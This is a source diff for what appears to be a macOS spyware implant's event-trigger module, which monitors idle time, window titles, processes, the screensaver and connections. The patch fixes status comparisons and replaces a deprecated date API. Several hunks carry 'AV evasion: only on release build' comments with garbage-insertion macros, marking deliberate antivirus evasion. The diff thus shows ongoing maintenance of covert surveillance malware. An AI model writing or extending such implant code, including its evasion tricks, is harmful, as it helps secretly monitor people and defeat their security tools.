@@ -187,8 +187,8 @@ extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID)
     
       for (int i=0; i<aDelay; i++) 
         { 
-          if ([configuration objectForKey: @"status"] == EVENT_STOP ||
-              [configuration objectForKey: @"status"] == EVENT_STOPPED) 
+            if ([[configuration objectForKey: @"status"] isEqual: EVENT_STOP] ||
+                [[configuration objectForKey: @"status"] isEqual: EVENT_STOPPED])
             {
               breaked = TRUE;
               break;
@@ -386,8 +386,8 @@ extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID)
   // AV evasion: only on release build
   AV_GARBAGE_005
   
-  while ([configuration objectForKey: @"status"] != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  while (![[configuration objectForKey: @"status"]  isEqual: EVENT_STOP]
+         && ![[configuration objectForKey: @"status"]  isEqual: EVENT_STOPPED])
   {
     amIInIdle = [self isInIdle: *seconds];
     
@@ -521,8 +521,8 @@ extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID)
   // AV evasion: only on release build
   AV_GARBAGE_001
   
-  while ([configuration objectForKey: @"status"] != EVENT_STOP &&
-         [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  while (![[configuration objectForKey: @"status"]  isEqual: EVENT_STOP] &&
+         ![[configuration objectForKey: @"status"] isEqual: EVENT_STOPPED])
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
@@ -649,7 +649,7 @@ extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID)
             // AV evasion: only on release build
             AV_GARBAGE_008
             
-              NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
+              NSDate *givenDate = [creationDate dateByAddingTimeInterval: configuredDate];
             
               if ([[NSDate date] isGreaterThan: givenDate])
               {
@@ -723,8 +723,8 @@ extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID)
               
               [dayStr release];
               
-              NSDate *lowDay  = [dayDate addTimeInterval: (low/1000)];  
-              NSDate *highDay = [dayDate addTimeInterval: (high/1000)];        
+              NSDate *lowDay  = [dayDate dateByAddingTimeInterval: (low/1000)];
+              NSDate *highDay = [dayDate dateByAddingTimeInterval: (high/1000)];
               
               // AV evasion: only on release build
               AV_GARBAGE_002
@@ -829,8 +829,8 @@ extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID)
   int iter          = [[configuration objectForKey:@"iter"] intValue];
   int end           = [[configuration objectForKey:@"end"] intValue];
   
-  while ([configuration objectForKey: @"status"]    != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  while (![[configuration objectForKey: @"status"]     isEqual: EVENT_STOP]
+         && ![[configuration objectForKey: @"status"] isEqual: EVENT_STOPPED])
   {
     NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
     connectionFound = FALSE;
@@ -1119,8 +1119,8 @@ extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID)
   if ((lookForTitle & EVENT_PROCESS_ON_WINDOW) == EVENT_PROCESS_ON_WINDOW)
     mode = EVENT_PROCESS_WIN_TITLE;
   
-  while ([configuration objectForKey: @"status"]    != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  while (![[configuration objectForKey: @"status"]  isEqual: EVENT_STOP]
+         && ![[configuration objectForKey: @"status"] isEqual: EVENT_STOPPED])
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       switch (mode)
@@ -1461,8 +1461,8 @@ extern CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID)
   NSString *process = [NSString stringWithString: SCREENSAVER_PROCESS];
   NSString *process_lowercaseString = [process lowercaseString];
   
-  while ([configuration objectForKey: @"status"] != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+    while (![[configuration objectForKey: @"status"] isEqual: EVENT_STOP]
+           && ![[configuration objectForKey: @"status"] isEqual: EVENT_STOPPED])
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
@@ -1558,8 +1558,8 @@ typedef struct {
   // AV evasion: only on release build
   AV_GARBAGE_003
   
-  while ([configuration objectForKey: @"status"] != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
+  while (![[configuration objectForKey: @"status"]  isEqual: EVENT_STOP]
+         && ![[configuration objectForKey: @"status"] isEqual: EVENT_STOPPED])
     {
       if (mEventQuotaRunning == NO && [[__m_MDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
         {
